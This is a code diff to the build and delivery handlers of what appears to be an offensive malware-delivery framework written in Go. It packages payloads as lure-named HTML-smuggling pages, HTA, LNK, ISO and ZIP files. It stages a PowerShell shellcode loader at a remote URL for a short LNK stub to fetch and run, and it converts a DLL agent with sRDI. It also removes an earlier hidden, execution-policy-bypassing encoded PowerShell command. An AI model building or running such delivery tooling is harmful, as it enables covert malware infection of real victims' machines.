@@ -799,10 +799,16 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		result["exe"] = exePath
-		if htmlPath, err := BuildHTML(exePath, deliveryDir); err == nil {
-			result["html"] = htmlPath
+		htmlLure := cfg.LureName
+		if htmlLure == "" {
+			htmlLure = cfg.OutputName
 		}
+		htmlPath, err := BuildHTML(exePath, deliveryDir, htmlLure)
+		if err != nil {
+			jsonErr(w, "build html: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["html"] = htmlPath
 
 	case cfg.Format == "loader":
 		if cfg.StageURL == "" {
@@ -1090,9 +1096,15 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		} else {
 			ps = psShellcodeLoader(binURL, key)
 		}
-		encoded := utf16LEBase64(ps)
-		psArgs := fmt.Sprintf(
-			"-WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s", encoded)
+		// Stage the full PS1 and use a short LNK stub (~260 chars).
+		// Windows truncates LNK Arguments at ~4096 chars; the encoded PS loader
+		// is 6000+ chars and would be silently cut, leaving PowerShell with nothing.
+		psArgs, ps1URL, err := StageLNKLoader(ps, cfg.StageURL, deliveryDir)
+		if err != nil {
+			jsonErr(w, "stage ps1: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["ps1_stage"] = ps1URL
 		op := operatorFromCert(r)
 
 		switch cfg.Format {
@@ -1118,7 +1130,6 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 				return
 			}
 			result["iso"] = isoPath
-			result["lnk"] = lnkPath
 			result["bin_stage"] = binURL
 			s.printf("[%s] build iso: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 
@@ -1213,7 +1224,6 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 				return
 			}
 			result["zip"] = zipPath
-			result["lnk"] = lnkPath
 			result["bin_stage"] = binURL
 		}
 
@@ -1224,14 +1234,12 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "build dll: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		result["dll"] = dllPath
 		srdiFlags := 0x1 // clear PE header on load
 		binPath, err := BuildSRDI(dllPath, "StartAgent", nil, srdiFlags, payloadsDir)
 		if err != nil {
 			jsonErr(w, "sRDI convert: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		result["bin"] = binPath
 		rawBin, err := os.ReadFile(binPath)
 		if err != nil {
 			jsonErr(w, "read srdi bin: "+err.Error(), http.StatusInternalServerError)
@@ -1988,7 +1996,7 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 
 	// HTML smuggling: embeds EXE directly, no shellcode staging needed
 	if cfg.Wrapper == "html" {
-		htmlPath, err := BuildHTML(artifactPath, deliveryDir)
+		htmlPath, err := BuildHTML(artifactPath, deliveryDir, lureName)
 		if err != nil {
 			jsonErr(w, "build html: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -2059,9 +2067,6 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 		ps = psShellcodeLoader(binURL, key)
 	}
 
-	encoded := utf16LEBase64(ps)
-	psArgs := fmt.Sprintf("-WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s", encoded)
-
 	wrap := func(path string, key string, err error) bool {
 		if err != nil {
 			jsonErr(w, key+": "+err.Error(), http.StatusInternalServerError)
@@ -2093,27 +2098,37 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 	case "hta":
 		p, e := BuildHTA(ps, deliveryDir, lureName)
 		if !wrap(p, "hta", e) { return }
-	case "lnk":
-		p, e := BuildLNK(psArgs, deliveryDir, lureName)
-		if !wrap(p, "lnk", e) { return }
-	case "iso":
-		lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
+	case "lnk", "iso", "zip":
+		// Stage PS1 and use a short stub in the LNK (~260 chars).
+		// Windows truncates LNK Arguments at ~4096 chars; the full encoded
+		// loader is 6000+ chars and is silently cut, leaving PS with nothing.
+		psArgs, ps1URL, err := StageLNKLoader(ps, cfg.StageURL, deliveryDir)
 		if err != nil {
-			jsonErr(w, "lnk: "+err.Error(), http.StatusInternalServerError)
+			jsonErr(w, "stage ps1: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		result["lnk"] = lnkPath
-		isoPath, err := BuildISO(map[string]string{lureName + ".lnk": lnkPath}, isoLabel, deliveryDir)
-		if !wrap(isoPath, "iso", err) { return }
-	case "zip":
-		lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
-		if err != nil {
-			jsonErr(w, "lnk: "+err.Error(), http.StatusInternalServerError)
-			return
+		result["ps1_stage"] = ps1URL
+		switch cfg.Wrapper {
+		case "lnk":
+			p, e := BuildLNK(psArgs, deliveryDir, lureName)
+			if !wrap(p, "lnk", e) { return }
+		case "iso":
+			lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
+			if err != nil {
+				jsonErr(w, "lnk: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+			isoPath, err := BuildISO(map[string]string{lureName + ".lnk": lnkPath}, isoLabel, deliveryDir)
+			if !wrap(isoPath, "iso", err) { return }
+		case "zip":
+			lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
+			if err != nil {
+				jsonErr(w, "lnk: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+			zipPath, err := BuildZIPLNK(lnkPath, lureName, deliveryDir)
+			if !wrap(zipPath, "zip", err) { return }
 		}
-		result["lnk"] = lnkPath
-		zipPath, err := BuildZIPLNK(lnkPath, lureName, deliveryDir)
-		if !wrap(zipPath, "zip", err) { return }
 	default:
 		jsonErr(w, "unknown wrapper: "+cfg.Wrapper, http.StatusBadRequest)
 		return
